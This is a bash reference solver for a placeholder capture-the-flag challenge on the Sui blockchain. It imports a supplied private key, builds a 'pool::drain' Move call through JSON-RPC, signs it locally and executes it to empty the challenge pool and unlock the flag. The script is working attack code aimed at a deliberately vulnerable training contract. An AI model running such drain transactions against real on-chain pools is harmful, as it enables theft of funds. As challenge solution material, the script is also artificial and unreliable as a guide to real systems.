#!/usr/bin/env bash
#
# Reference solver for the placeholder challenge. It drains the pool (the win
# condition), after which `nc <host> 1337` option 3 returns the flag.
#
# IMPORTANT: your rpc_url is a JSON-RPC endpoint served through the orchestrator's
# path proxy. The `sui` CLI's transaction transport uses gRPC/HTTP2 (Sui >=1.74),
# which does NOT traverse the path proxy — so this solver (and real exploits)
# should use JSON-RPC / an SDK, exactly like below (build -> local sign ->
# execute). The @mysten/sui and pysui SDKs use JSON-RPC and work as-is.
#
# Usage (values come from the nc output):
#   RPC_URL=http://host:8080/<uuid>  PRIVATE_KEY=suiprivkey1...  \
#   PACKAGE_ID=0x...  POOL_ID=0x...  ./solve.sh
set -euo pipefail

: "${RPC_URL:?set RPC_URL from the nc output}"
: "${PRIVATE_KEY:?set PRIVATE_KEY (suiprivkey1...) from the nc output}"
: "${PACKAGE_ID:?set PACKAGE_ID from the nc output}"
: "${POOL_ID:?set POOL_ID (the ::pool::Pool object id) from the nc output}"

# Throwaway CLI config just for local key handling / signing (no ~/.sui touched).
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
export HOME="$WORK"
CFG="$HOME/.sui/sui_config"
mkdir -p "$CFG"
echo '[]' > "$CFG/sui.keystore"
cat > "$CFG/client.yaml" <<EOF
keystore:
  File: $CFG/sui.keystore
envs:
  - alias: ctf
    rpc: "$RPC_URL"
    ws: ~
    basic_auth: ~
active_env: ctf
active_address: ~
EOF

rpc() { curl -s -X POST "$RPC_URL" -H 'content-type: application/json' -d "$1"; }

ADDR="$(sui keytool import "$PRIVATE_KEY" ed25519 --json | jq -r '.suiAddress')"
echo "[*] solving as $ADDR"
echo "[*] rpc:    $RPC_URL"

echo "[*] building drain tx (JSON-RPC unsafe_moveCall)..."
TXB="$(rpc "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"unsafe_moveCall\",\"params\":[\"$ADDR\",\"$PACKAGE_ID\",\"pool\",\"drain\",[],[\"$POOL_ID\"],null,\"500000000\"]}" | jq -r '.result.txBytes // empty')"
[ -n "$TXB" ] || { echo "[!] failed to build the transaction"; exit 1; }

echo "[*] signing locally..."
SIG="$(sui keytool sign --address "$ADDR" --data "$TXB" --json | jq -r '.suiSignature')"

echo "[*] executing (JSON-RPC executeTransactionBlock)..."
STATUS="$(rpc "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"sui_executeTransactionBlock\",\"params\":[\"$TXB\",[\"$SIG\"],{\"showEffects\":true},\"WaitForLocalExecution\"]}" | jq -r '.result.effects.status.status // "error"')"
echo "[*] status: $STATUS"
[ "$STATUS" = "success" ] || { echo "[!] drain failed"; exit 1; }

echo "[+] pool drained. Grab your flag:  nc <host> 1337  ->  option 3  ->  your uuid"
